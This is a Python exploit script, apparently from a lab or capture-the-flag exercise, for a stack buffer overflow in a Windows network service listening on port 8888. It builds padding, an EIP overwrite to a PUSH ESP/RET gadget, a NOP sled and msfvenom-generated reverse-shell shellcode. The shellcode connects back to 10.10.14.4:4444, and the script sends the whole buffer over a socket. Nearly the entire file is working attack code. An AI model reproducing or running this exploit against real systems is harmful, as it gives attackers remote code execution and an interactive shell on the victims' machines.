

import socket
import sys

target = "127.0.0.1"
padding1 = b"\x90" * 1052
EIP = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS = b"\x90" * 30

#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
payload = b"\xdb\xc1\xbd\xa5\xf4\x1e\x1f\xd9\x74\x24\xf4\x5a"
payload += b"\x2b\xc9\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\xcf"
payload += b"\xe7\xfc\xea\xf3\xe0\x83\x15\x0b\xf1\xe3\x9c\xee"
payload += b"\xc0\x23\xfa\x7b\x72\x94\x88\x29\x7f\x5f\xdc\xd9"
payload += b"\xf4\x2d\xc9\xee\xbd\x98\x2f\xc1\x3e\xb0\x0c\x40"
payload += b"\xbd\xcb\x40\xa2\xfc\x03\x95\xa3\x39\x79\x54\xf1"
payload += b"\x92\xf5\xcb\xe5\x97\x40\xd0\x8e\xe4\x45\x50\x73"
payload += b"\xbc\x64\x71\x22\xb6\x3e\x51\xc5\x1b\x4b\xd8\xdd"
payload += b"\x78\x76\x92\x56\x4a\x0c\x25\xbe\x82\xed\x8a\xff"
payload += b"\x2a\x1c\xd2\x38\x8c\xff\xa1\x30\xee\x82\xb1\x87"
payload += b"\x8c\x58\x37\x13\x36\x2a\xef\xff\xc6\xff\x76\x74"
payload += b"\xc4\xb4\xfd\xd2\xc9\x4b\xd1\x69\xf5\xc0\xd4\xbd"
payload += b"\x7f\x92\xf2\x19\xdb\x40\x9a\x38\x81\x27\xa3\x5a"
payload += b"\x6a\x97\x01\x11\x87\xcc\x3b\x78\xc0\x21\x76\x82"
payload += b"\x10\x2e\x01\xf1\x22\xf1\xb9\x9d\x0e\x7a\x64\x5a"
payload += b"\x70\x51\xd0\xf4\x8f\x5a\x21\xdd\x4b\x0e\x71\x75"
payload += b"\x7d\x2f\x1a\x85\x82\xfa\x8d\xd5\x2c\x55\x6e\x85"
payload += b"\x8c\x05\x06\xcf\x02\x79\x36\xf0\xc8\x12\xdd\x0b"
payload += b"\x9b\x16\x28\x1d\x54\x4f\x2e\x21\x7b\xd3\xa7\xc7"
payload += b"\x11\xfb\xe1\x50\x8e\x62\xa8\x2a\x2f\x6a\x66\x57"
payload += b"\x6f\xe0\x85\xa8\x3e\x01\xe3\xba\xd7\xe1\xbe\xe0"
payload += b"\x7e\xfd\x14\x8c\x1d\x6c\xf3\x4c\x6b\x8d\xac\x1b"
payload += b"\x3c\x63\xa5\xc9\xd0\xda\x1f\xef\x28\xba\x58\xab"
payload += b"\xf6\x7f\x66\x32\x7a\x3b\x4c\x24\x42\xc4\xc8\x10"
payload += b"\x1a\x93\x86\xce\xdc\x4d\x69\xb8\xb6\x22\x23\x2c"
payload += b"\x4e\x09\xf4\x2a\x4f\x44\x82\xd2\xfe\x31\xd3\xed"
payload += b"\xcf\xd5\xd3\x96\x2d\x46\x1b\x4d\xf6\x66\xfe\x47"
payload += b"\x03\x0f\xa7\x02\xae\x52\x58\xf9\xed\x6a\xdb\x0b"
payload += b"\x8e\x88\xc3\x7e\x8b\xd5\x43\x93\xe1\x46\x26\x93"
payload += b"\x56\x66\x63"

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target,8888))
   s.send(buf)
except Exception as e:
   print(sys.exc_value)
